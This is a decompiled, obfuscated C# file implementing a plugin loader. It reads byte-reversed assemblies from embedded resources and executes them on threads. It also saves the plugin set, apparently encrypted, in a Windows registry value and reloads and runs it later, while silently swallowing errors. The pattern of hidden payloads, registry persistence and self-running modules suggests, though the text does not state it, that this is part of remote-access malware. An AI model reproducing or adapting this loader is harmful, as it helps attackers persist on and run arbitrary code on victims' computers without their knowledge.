using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using Microsoft.Win32;
using Plugin;

namespace ns0;

public class GClass1
{
	public delegate void GDelegate0(object object_0, IPlugin iplugin_0);

	private static GDelegate0 gdelegate0_0;

	public static SortedList<Guid, byte[]> sortedList_0 = new SortedList<Guid, byte[]>();

	public static SortedList<Guid, IPlugin> sortedList_1 = new SortedList<Guid, IPlugin>();

	private static string string_0 = string.Empty;

	[CompilerGenerated]
	private static ThreadStart _003C_003E9__CachedAnonymousMethodDelegate1;

	[CompilerGenerated]
	private static ThreadStart _003C_003E9__CachedAnonymousMethodDelegate3;

	public static event GDelegate0 PluginAdded
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			gdelegate0_0 = (GDelegate0)Delegate.Combine(gdelegate0_0, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			gdelegate0_0 = (GDelegate0)Delegate.Remove(gdelegate0_0, value);
		}
	}

	public static void smethod_0()
	{
		try
		{
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			MemoryStream memoryStream = new MemoryStream();
			binaryFormatter.Serialize(memoryStream, sortedList_0);
			memoryStream.Close();
			byte[] value = Class0.smethod_0(memoryStream.ToArray(), bool_0: false);
			RegistryHive registryHive_ = Class5.registryHive_0;
			if (registryHive_ == RegistryHive.CurrentUser)
			{
				Registry.CurrentUser.CreateSubKey(Class5.string_9).SetValue(Class5.string_8, value);
			}
			else
			{
				Registry.LocalMachine.CreateSubKey(Class5.string_9).SetValue(Class5.string_8, value);
			}
		}
		catch
		{
		}
	}

	public static void smethod_1()
	{
		ThreadStart start = delegate
		{
			try
			{
				BinaryFormatter binaryFormatter = new BinaryFormatter();
				RegistryHive registryHive_ = Class5.registryHive_0;
				if (registryHive_ == RegistryHive.CurrentUser)
				{
					byte[] byte_ = Registry.CurrentUser.CreateSubKey(Class5.string_9).GetValue(Class5.string_8) as byte[];
					byte_ = Class0.smethod_1(byte_, bool_0: false);
					MemoryStream memoryStream = new MemoryStream(byte_);
					sortedList_0 = binaryFormatter.Deserialize(memoryStream) as SortedList<Guid, byte[]>;
					memoryStream.Close();
					memoryStream.Dispose();
					memoryStream = null;
					byte_ = null;
				}
				else
				{
					byte[] byte_ = Registry.LocalMachine.CreateSubKey(Class5.string_9).GetValue(Class5.string_8) as byte[];
					byte_ = Class0.smethod_1(byte_, bool_0: false);
					MemoryStream memoryStream = new MemoryStream(byte_);
					sortedList_0 = binaryFormatter.Deserialize(memoryStream) as SortedList<Guid, byte[]>;
					memoryStream.Close();
					memoryStream.Dispose();
					memoryStream = null;
					byte_ = null;
				}
				binaryFormatter = null;
				foreach (byte[] value in sortedList_0.Values)
				{
					smethod_3(value);
				}
			}
			catch
			{
			}
		};
		new Thread(start).Start();
	}

	public static void smethod_2()
	{
		ThreadStart start = delegate
		{
			try
			{
				string[] manifestResourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
				if (manifestResourceNames.Length != 0)
				{
					ResourceManager resourceManager = new ResourceManager("p", Assembly.GetExecutingAssembly());
					int num = (int)resourceManager.GetObject("Len");
					for (int i = 0; i < num; i++)
					{
						byte[] array = (byte[])resourceManager.GetObject(i.ToString());
						Array.Reverse((Array)array);
						smethod_3(array);
					}
					if (Class5.bool_0)
					{
						smethod_0();
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
		};
		new Thread(start).Start();
	}

	public static bool smethod_3(byte[] byte_0)
	{
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		try
		{
			Assembly assembly = Assembly.Load(byte_0);
			Type[] types = assembly.GetTypes();
			foreach (Type type in types)
			{
				int num = 0;
				if (type.IsClass && type.IsSubclassOf(typeof(IPlugin)))
				{
					IPlugin val = (IPlugin)Activator.CreateInstance(type);
					if (val.get_ExecuteOnLoad())
					{
						val.Initialize();
						smethod_7(null, val, val.get_ExecuteOnLoadArgs());
					}
					if (!sortedList_0.ContainsKey(val.get_Guid()))
					{
						sortedList_0.Add(val.get_Guid(), byte_0);
					}
					else
					{
						num++;
					}
					if (!sortedList_1.ContainsKey(val.get_Guid()))
					{
						sortedList_1.Add(val.get_Guid(), val);
					}
					else
					{
						num++;
					}
					string_0 = string.Empty;
					if (num == 2)
					{
						string_0 = val.get_Name() + ": Already Stored";
						return false;
					}
					if (gdelegate0_0 != null)
					{
						gdelegate0_0(null, val);
					}
					return true;
				}
			}
			string_0 = "Class with IPlugin interface not found...";
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			string_0 = ex.Message;
		}
		return false;
	}

	public static bool smethod_4(IPlugin iplugin_0)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		if (!sortedList_1.ContainsKey(iplugin_0.get_Guid()))
		{
			sortedList_1.Add(iplugin_0.get_Guid(), iplugin_0);
			string_0 = string.Empty;
			if (gdelegate0_0 != null)
			{
				gdelegate0_0(null, iplugin_0);
			}
			return true;
		}
		string_0 = iplugin_0.get_Name() + ": Already Stored";
		return false;
	}

	public static void smethod_5(Guid guid_0)
	{
		if (sortedList_1.ContainsKey(guid_0))
		{
			sortedList_0.Remove(guid_0);
			sortedList_1.Remove(guid_0);
		}
	}

	public static string smethod_6()
	{
		return string_0;
	}

	public static void smethod_7(object object_0, IPlugin iplugin_0, PluginArgs pluginArgs_0)
	{
		ThreadStart start = delegate
		{
			try
			{
				iplugin_0.Execute(object_0, pluginArgs_0);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
		};
		new Thread(start).Start();
	}
}
